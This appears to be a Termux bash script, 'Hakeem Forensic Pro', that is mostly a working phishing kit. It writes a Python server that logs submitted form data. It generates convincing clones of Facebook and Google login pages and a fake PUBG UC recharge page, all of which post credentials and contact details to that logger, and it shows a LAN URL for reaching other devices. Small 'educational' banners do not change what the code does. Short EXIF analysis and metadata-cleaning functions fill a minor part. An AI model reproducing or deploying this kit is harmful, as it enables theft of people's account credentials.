#!/bin/bash
# ===================================================
# 🔥 H A K E E M   F O R E N S I C   P R O
# 👑 DEVELOPED BY: H A K E E M
# 🎯 VERSION: ULTIMATE 2024
# 🌐 GitHub: https://github.com/hakim738-html
# ===================================================

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
HAKEEM_RED='\033[38;5;196m'
HAKEEM_GOLD='\033[38;5;220m'
NC='\033[0m'

# Banner
show_banner() {
    clear
    echo -e "${HAKEEM_RED}"
    echo " ██╗  ██╗ █████╗ ██╗  ██╗███████╗███████╗███╗   ███╗"
    echo " ██║  ██║██╔══██╗██║ ██╔╝██╔════╝██╔════╝████╗ ████║"
    echo " ███████║███████║█████╔╝ █████╗  █████╗  ██╔████╔██║"
    echo " ██╔══██║██╔══██║██╔═██╗ ██╔══╝  ██╔══╝  ██║╚██╔╝██║"
    echo " ██║  ██║██║  ██║██║  ██╗███████╗███████╗██║ ╚═╝ ██║"
    echo " ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝     ╚═╝"
    echo -e "${HAKEEM_GOLD}"
    echo "       F O R E N S I C   &   S E C U R I T Y   S U I T E"
    echo -e "${CYAN}"
    echo "       👑 Developer: H A K E E M"
    echo "       🌐 GitHub: hakim738-html"
    echo -e "${NC}"
}

# Check tools
check_tools() {
    echo -e "${CYAN}🔍 Checking tools...${NC}"
    
    if ! command -v exiftool &> /dev/null; then
        echo -e "${YELLOW}Installing ExifTool...${NC}"
        pkg install exiftool -y
    fi
    
    if ! command -v python3 &> /dev/null; then
        echo -e "${YELLOW}Installing Python...${NC}"
        pkg install python -y
    fi
    
    mkdir -p ~/Hakeem-Data/{pages,logs,captured}
    echo -e "${GREEN}✅ Ready!${NC}"
}

# Start logging server
start_logging_server() {
    echo -e "${YELLOW}📡 Starting data logger...${NC}"
    
    # Create logging server script
    cat > ~/Hakeem-Data/logger.py << 'EOF'
#!/usr/bin/env python3
import http.server
import socketserver
import json
from datetime import datetime
import urllib.parse
import os

PORT = 9999
LOG_FILE = "captured_data.json"

class LoggingHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"HAKEEM LOGGER READY")
    
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        try:
            data = urllib.parse.parse_qs(post_data)
            log_entry = {
                'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                'page': self.headers.get('Referer', 'Unknown'),
                'ip': self.client_address[0],
                'data': {}
            }
            
            # Extract all form data
            for key, value in data.items():
                if value:
                    log_entry['data'][key] = value[0]
            
            # Save to file
            with open(LOG_FILE, 'a') as f:
                f.write(json.dumps(log_entry) + '\n')
            
            # Print to terminal
            print(f"\n📥 [CAPTURED DATA] {datetime.now().strftime('%H:%M:%S')}")
            print(f"🌐 Page: {log_entry['page']}")
            print(f"📝 Data: {json.dumps(log_entry['data'], indent=2)}")
            print("-" * 50)
            
            # Send redirect response
            self.send_response(302)
            self.send_header('Location', 'https://www.google.com')
            self.end_headers()
            
        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    
    print("=" * 60)
    print("🔥 HAKEEM DATA LOGGER - ACTIVE")
    print("=" * 60)
    print(f"📡 Port: {PORT}")
    print(f"📁 Log file: {LOG_FILE}")
    print(f"👁️  Monitoring form submissions...")
    print("=" * 60)
    
    with socketserver.TCPServer(("", PORT), LoggingHandler) as httpd:
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n[!] Logger stopped")
EOF
    
    chmod +x ~/Hakeem-Data/logger.py
    
    # Start logger in background
    python3 ~/Hakeem-Data/logger.py > ~/Hakeem-Data/logs/logger.log 2>&1 &
    LOGGER_PID=$!
    echo $LOGGER_PID > ~/Hakeem-Data/logs/logger.pid
    
    echo -e "${GREEN}✅ Logger started on port 9999${NC}"
    sleep 2
}

# Stop logging server
stop_logging_server() {
    if [ -f ~/Hakeem-Data/logs/logger.pid ]; then
        kill $(cat ~/Hakeem-Data/logs/logger.pid) 2>/dev/null
        rm ~/Hakeem-Data/logs/logger.pid
        echo -e "${GREEN}✅ Logger stopped${NC}"
    fi
}

# Create Facebook page
create_facebook_page() {
    page="FACEBOOK_$(date +%H%M%S).html"
    
    cat > ~/Hakeem-Data/pages/$page << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Facebook - Log In</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; background: #f0f2f5; }
        .container { max-width: 400px; margin: 50px auto; padding: 20px; }
        .logo { color: #1877f2; font-size: 48px; font-weight: bold; text-align: center; margin-bottom: 20px; }
        .box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; font-size: 16px; }
        button { width: 100%; padding: 14px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; }
        button:hover { background: #166fe5; }
        .footer { text-align: center; margin-top: 20px; color: #666; }
        .alert { background: #fff3cd; border: 1px solid #ffeaa7; color: #856404; padding: 10px; border-radius: 4px; margin: 10px 0; text-align: center; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">facebook</div>
        
        <div class="box">
            <h2 style="text-align: center; margin-bottom: 20px;">Log into Facebook</h2>
            
            <form id="loginForm" method="POST" action="http://localhost:9999">
                <input type="hidden" name="page_type" value="facebook">
                
                <input type="text" name="email_phone" placeholder="Email or phone number" required>
                <input type="password" name="password" placeholder="Password" required>
                
                <button type="submit">Log In</button>
            </form>
            
            <div class="footer">
                <a href="#" style="color: #1877f2; text-decoration: none;">Forgot password?</a>
                <hr style="margin: 20px 0;">
                <button onclick="createAccount()" style="background: #42b72a;">Create New Account</button>
            </div>
        </div>
        
        <div class="alert">
            ⚠️ <strong>Educational Page</strong> - Created by Hakeem Forensic Tools
        </div>
    </div>

    <script>
        function createAccount() {
            alert("This is an educational demonstration page only.");
        }
        
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            setTimeout(function() {
                alert("Educational: Form data would be logged locally for security training.");
            }, 100);
        });
    </script>
</body>
</html>
EOF
    
    echo -e "${GREEN}✅ Facebook page created: $page${NC}"
    start_web_server "$page"
}

# Create Google account page
create_google_page() {
    page="GOOGLE_$(date +%H%M%S).html"
    
    cat > ~/Hakeem-Data/pages/$page << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Google Account</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Roboto', Arial, sans-serif; background: white; }
        .header { text-align: center; padding: 30px 0; }
        .google-logo { font-size: 42px; font-weight: bold; }
        .g-blue { color: #4285f4; }
        .g-red { color: #ea4335; }
        .g-yellow { color: #fbbc05; }
        .g-green { color: #34a853; }
        .container { max-width: 450px; margin: 0 auto; padding: 0 20px; }
        .card { border: 1px solid #dadce0; border-radius: 8px; padding: 40px 40px; }
        h1 { text-align: center; font-size: 24px; font-weight: 400; margin-bottom: 10px; }
        .subtitle { text-align: center; color: #5f6368; margin-bottom: 40px; }
        input { width: 100%; padding: 13px 15px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; }
        input:focus { border-color: #1a73e8; outline: none; box-shadow: 0 0 0 2px #e8f0fe; }
        .button-group { display: flex; justify-content: space-between; margin-top: 40px; }
        button { padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; }
        .next-btn { background: #1a73e8; color: white; border: none; }
        .next-btn:hover { background: #166fe5; box-shadow: 0 1px 3px rgba(66,133,244,0.3); }
        .create-btn { background: white; color: #1a73e8; border: 1px solid #dadce0; }
        .create-btn:hover { background: #f7f8f8; }
        .footer { text-align: center; margin-top: 30px; color: #5f6368; font-size: 12px; }
        .language { position: absolute; top: 20px; right: 20px; color: #5f6368; }
        .alert { background: #fef7e0; border: 1px solid #fef0c3; color: #93370d; padding: 12px; border-radius: 6px; margin: 20px 0; text-align: center; }
    </style>
</head>
<body>
    <div class="language">English (United States)</div>
    
    <div class="header">
        <div class="google-logo">
            <span class="g-blue">G</span>
            <span class="g-red">o</span>
            <span class="g-yellow">o</span>
            <span class="g-blue">g</span>
            <span class="g-green">l</span>
            <span class="g-red">e</span>
        </div>
    </div>
    
    <div class="container">
        <div class="card">
            <h1>Sign in</h1>
            <div class="subtitle">Use your Google Account</div>
            
            <form id="googleForm" method="POST" action="http://localhost:9999">
                <input type="hidden" name="page_type" value="google_account">
                
                <input type="email" name="email" placeholder="Email or phone" required>
                <input type="password" name="password" placeholder="Enter your password" required>
                
                <div style="margin-top: 10px;">
                    <a href="#" style="color: #1a73e8; text-decoration: none; font-size: 14px;">Forgot email?</a>
                </div>
                
                <div class="button-group">
                    <button type="button" class="create-btn" onclick="createAccount()">Create account</button>
                    <button type="submit" class="next-btn">Next</button>
                </div>
            </form>
        </div>
        
        <div class="alert">
            🔒 <strong>Security Training Page</strong> - This simulates login for educational purposes
        </div>
        
        <div class="footer">
            <div style="margin-bottom: 10px;">
                <a href="#" style="color: #1a73e8; text-decoration: none; margin: 0 10px;">Help</a>
                <a href="#" style="color: #1a73e8; text-decoration: none; margin: 0 10px;">Privacy</a>
                <a href="#" style="color: #1a73e8; text-decoration: none; margin: 0 10px;">Terms</a>
            </div>
            <div>© 2024 Hakeem Forensic Tools - Educational Use Only</div>
        </div>
    </div>

    <script>
        function createAccount() {
            alert("Account creation is disabled in this educational demonstration.");
        }
        
        document.getElementById('googleForm').addEventListener('submit', function(e) {
            setTimeout(function() {
                alert("Educational: Form submission captured for security awareness training.");
            }, 100);
        });
    </script>
</body>
</html>
EOF
    
    echo -e "${GREEN}✅ Google page created: $page${NC}"
    start_web_server "$page"
}

# Create PUBG UC recharge page
create_pubg_page() {
    page="PUBG_UC_$(date +%H%M%S).html"
    
    cat > ~/Hakeem-Data/pages/$page << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>PUBG UC Recharge</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); color: white; }
        .container { max-width: 500px; margin: 0 auto; padding: 20px; }
        .header { text-align: center; padding: 30px 0; }
        .pubg-logo { font-size: 42px; font-weight: bold; color: #ffcc00; text-shadow: 2px 2px 0 #ff0000; }
        .tagline { color: #aaa; margin-top: 10px; }
        .offer-banner { background: linear-gradient(90deg, #ff0000, #ff6600); padding: 15px; border-radius: 10px; text-align: center; margin: 20px 0; }
        .uc-packs { display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; margin: 20px 0; }
        .uc-pack { background: rgba(255, 255, 255, 0.1); border: 2px solid #ff9900; border-radius: 8px; padding: 20px; text-align: center; cursor: pointer; transition: transform 0.3s; }
        .uc-pack:hover { transform: scale(1.05); border-color: #ffcc00; }
        .uc-amount { font-size: 24px; font-weight: bold; color: #ffcc00; }
        .uc-price { color: #aaa; margin-top: 5px; }
        .form-section { background: rgba(255, 255, 255, 0.05); padding: 25px; border-radius: 10px; margin: 20px 0; }
        input, select { width: 100%; padding: 12px; margin: 10px 0; background: rgba(255, 255, 255, 0.1); border: 1px solid #444; border-radius: 6px; color: white; }
        .payment-methods { display: flex; gap: 10px; margin: 15px 0; }
        .payment-btn { flex: 1; padding: 12px; background: #333; border: none; border-radius: 6px; color: white; cursor: pointer; }
        .payment-btn.active { background: #ff9900; }
        .recharge-btn { width: 100%; padding: 15px; background: linear-gradient(90deg, #ff0000, #ff6600); color: white; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 20px; }
        .recharge-btn:hover { background: linear-gradient(90deg, #ff6600, #ff0000); }
        .warning { background: rgba(255, 153, 0, 0.1); border: 1px solid #ff9900; padding: 15px; border-radius: 8px; margin-top: 20px; text-align: center; }
        .footer { text-align: center; margin-top: 30px; color: #888; font-size: 12px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="pubg-logo">PUBG MOBILE</div>
            <div class="tagline">Official UC Recharge Center</div>
        </div>
        
        <div class="offer-banner">
            🎉 SPECIAL OFFER! Get 20% Bonus UC on first recharge! 🎉
        </div>
        
        <div class="uc-packs">
            <div class="uc-pack" onclick="selectPack(60, '$0.99')">
                <div class="uc-amount">60 UC</div>
                <div class="uc-price">$0.99</div>
            </div>
            <div class="uc-pack" onclick="selectPack(325, '$4.99')">
                <div class="uc-amount">325 UC</div>
                <div class="uc-price">$4.99</div>
            </div>
            <div class="uc-pack" onclick="selectPack(660, '$9.99')">
                <div class="uc-amount">660 UC</div>
                <div class="uc-price">$9.99</div>
            </div>
            <div class="uc-pack" onclick="selectPack(1800, '$24.99')">
                <div class="uc-amount">1800 UC</div>
                <div class="uc-price">$24.99</div>
            </div>
        </div>
        
        <div class="form-section">
            <form id="rechargeForm" method="POST" action="http://localhost:9999">
                <input type="hidden" name="page_type" value="pubg_recharge">
                <input type="hidden" id="selected_uc" name="uc_amount" value="60">
                <input type="hidden" id="selected_price" name="price" value="$0.99">
                
                <input type="text" name="pubg_id" placeholder="PUBG Player ID" required>
                <input type="text" name="character_name" placeholder="Character Name" required>
                <input type="email" name="email" placeholder="Email Address" required>
                <input type="tel" name="phone" placeholder="Phone Number (for receipt)">
                
                <div style="margin: 15px 0;">
                    <label style="display: block; margin-bottom: 8px;">Payment Method:</label>
                    <div class="payment-methods">
                        <button type="button" class="payment-btn active" onclick="selectPayment('credit_card')">💳 Card</button>
                        <button type="button" class="payment-btn" onclick="selectPayment('paypal')">PayPal</button>
                        <button type="button" class="payment-btn" onclick="selectPayment('google_pay')">Google Pay</button>
                    </div>
                    <input type="hidden" id="payment_method" name="payment_method" value="credit_card">
                </div>
                
                <button type="submit" class="recharge-btn">
                    ⚡ RECHARGE NOW & GET BONUS!
                </button>
            </form>
        </div>
        
        <div class="warning">
            ⚠️ <strong>Educational Demonstration</strong><br>
            This page is for cybersecurity training only. No real transactions occur.
        </div>
        
        <div class="footer">
            <div>© 2024 PUBG MOBILE. All trademarks belong to their respective owners.</div>
            <div style="margin-top: 10px;">Educational page created by <strong>Hakeem Forensic Tools</strong></div>
        </div>
    </div>

    <script>
        let selectedPack = { uc: 60, price: '$0.99' };
        let paymentMethod = 'credit_card';
        
        function selectPack(uc, price) {
            selectedPack = { uc, price };
            document.getElementById('selected_uc').value = uc;
            document.getElementById('selected_price').value = price;
            
            // Highlight selected pack
            document.querySelectorAll('.uc-pack').forEach(pack => {
                pack.style.borderColor = '#ff9900';
                pack.style.transform = 'scale(1)';
            });
            event.currentTarget.style.borderColor = '#ffcc00';
            event.currentTarget.style.transform = 'scale(1.05)';
            
            alert(`Selected: ${uc} UC for ${price}`);
        }
        
        function selectPayment(method) {
            paymentMethod = method;
            document.getElementById('payment_method').value = method;
            
            document.querySelectorAll('.payment-btn').forEach(btn => {
                btn.classList.remove('active');
            });
            event.currentTarget.classList.add('active');
        }
        
        document.getElementById('rechargeForm').addEventListener('submit', function(e) {
            setTimeout(function() {
                alert(`🎮 Educational Demo\nSelected: ${selectedPack.uc} UC\nPrice: ${selectedPack.price}\nData captured for security training.`);
            }, 100);
        });
        
        // Select first pack by default
        selectPack(60, '$0.99');
    </script>
</body>
</html>
EOF
    
    echo -e "${GREEN}✅ PUBG UC page created: $page${NC}"
    start_web_server "$page"
}

# Start web server
start_web_server() {
    local page=$1
    
    echo -e "${YELLOW}🚀 Starting web server...${NC}"
    
    # Stop any existing server
    pkill -f "http.server 8080" 2>/dev/null
    
    # Start new server
    cd ~/Hakeem-Data/pages
    python3 -m http.server 8080 > ~/Hakeem-Data/logs/server.log 2>&1 &
    SERVER_PID=$!
    
    sleep 2
    
    echo -e "${GREEN}✅ Server started!${NC}"
    echo -e "${CYAN}🌐 Local URL:${NC} http://localhost:8080/$page"
    echo -e "${CYAN}📱 On Phone:${NC} Use same WiFi, check IP below"
    
    # Show IP address
    IP=$(ifconfig | grep -oE 'inet [0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | grep -v '127.0.0.1' | head -1 | cut -d' ' -f2)
    if [ -n "$IP" ]; then
        echo -e "${CYAN}📡 Network URL:${NC} http://$IP:8080/$page"
    fi
    
    # Try to open automatically
    if command -v termux-open > /dev/null; then
        echo -e "${BLUE}📱 Opening browser...${NC}"
        termux-open "http://localhost:8080/$page"
    else
        echo -e "${YELLOW}📋 Open manually in browser${NC}"
    fi
    
    echo -e "\n${PURPLE}👁️  All form data will appear in Terminal!${NC}"
    echo -e "${YELLOW}⏸️ Press Enter when done...${NC}"
    read
    
    # Stop server
    kill $SERVER_PID 2>/dev/null
    echo -e "${GREEN}✅ Server stopped${NC}"
}

# View captured data
view_captured_data() {
    echo -e "${CYAN}📊 Viewing captured data...${NC}"
    
    if [ -f ~/Hakeem-Data/captured_data.json ]; then
        echo -e "${YELLOW}📁 Captured entries:${NC}"
        cat ~/Hakeem-Data/captured_data.json
        
        echo -e "\n${GREEN}📈 Total entries: $(wc -l < ~/Hakeem-Data/captured_data.json 2>/dev/null || echo 0)${NC}"
    else
        echo -e "${RED}❌ No data captured yet${NC}"
        echo -e "${YELLOW}ℹ️ Submit forms on pages to see data here${NC}"
    fi
}

# Image analysis tool
analyze_image() {
    echo -e "${CYAN}🎯 Image path:${NC}"
    read img
    
    if [ ! -f "$img" ]; then
        echo -e "${RED}❌ File not found${NC}"
        return
    fi
    
    echo -e "${YELLOW}🔍 Analyzing...${NC}"
    
    echo -e "${BLUE}📁 Basic Info:${NC}"
    echo "Name: $(basename "$img")"
    echo "Size: $(du -h "$img" | cut -f1)"
    echo "Type: $(file "$img")"
    
    echo -e "${BLUE}📸 EXIF Data:${NC}"
    exiftool "$img" | grep -E "(Make|Model|DateTime|GPS|Author)" | head -10
    
    echo -e "${BLUE}📍 GPS Check:${NC}"
    lat=$(exiftool -n -GPSLatitude "$img" 2>/dev/null)
    lon=$(exiftool -n -GPSLongitude "$img" 2>/dev/null)
    
    if [ -n "$lat" ] && [ -n "$lon" ]; then
        echo -e "${RED}⚠️ Location data found!${NC}"
        echo "$lat"
        echo "$lon"
    else
        echo "No GPS data"
    fi
}

# Clean metadata
clean_metadata() {
    echo -e "${CYAN}🎯 Image to clean:${NC}"
    read img
    
    backup="BACKUP_$(date +%H%M%S)_$(basename "$img")"
    cp "$img" "$backup"
    
    echo -e "${YELLOW}🧹 Cleaning metadata...${NC}"
    exiftool -all= "$img" 2>/dev/null
    
    echo -e "${GREEN}✅ Cleaned!${NC}"
    echo -e "${BLUE}💾 Backup saved: $backup${NC}"
}

# Main menu
main_menu() {
    # Start logging server automatically
    start_logging_server
    
    while true; do
        show_banner
        
        echo -e "${CYAN}━━━━━━ WEB PAGES (DATA LOGGING) ━━━━━━${NC}"
        echo -e "${GREEN}【1】📘 Facebook Login Page"
        echo -e "【2】🔵 Google Account Page"
        echo -e "【3】🎮 PUBG UC Recharge Page"
        
        echo -e "${CYAN}\n━━━━━━ IMAGE FORENSICS ━━━━━━${NC}"
        echo -e "${BLUE}【4】🔍 Analyze Image Metadata"
        echo -e "【5】🧹 Clean Image Metadata"
        
        echo -e "${CYAN}\n━━━━━━ DATA & LOGS ━━━━━━${NC}"
        echo -e "${PURPLE}【6】📊 View Captured Data"
        echo -e "【7】📁 Open Data Folder"
        
        echo -e "${CYAN}\n━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        echo -e "${RED}【0】🚪 Exit (Stops logger)${NC}"
        echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        
        echo -e "${YELLOW}👁️ Data logger active on port 9999${NC}"
        
        read -p "Select: " choice
        
        case $choice in
            1) create_facebook_page ;;
            2) create_google_page ;;
            3) create_pubg_page ;;
            4) analyze_image ;;
            5) clean_metadata ;;
            6) view_captured_data ;;
            7)
                cd ~/Hakeem-Data
                echo -e "${GREEN}📂 Data folder opened${NC}"
                ls -la
                ;;
            0)
                stop_logging_server
                echo -e "${GREEN}👋 Bye! - Hakeem${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}❌ Invalid choice${NC}"
                ;;
        esac
        
        echo ""
        read -p "Press Enter..."
    done
}

# Start
main_menu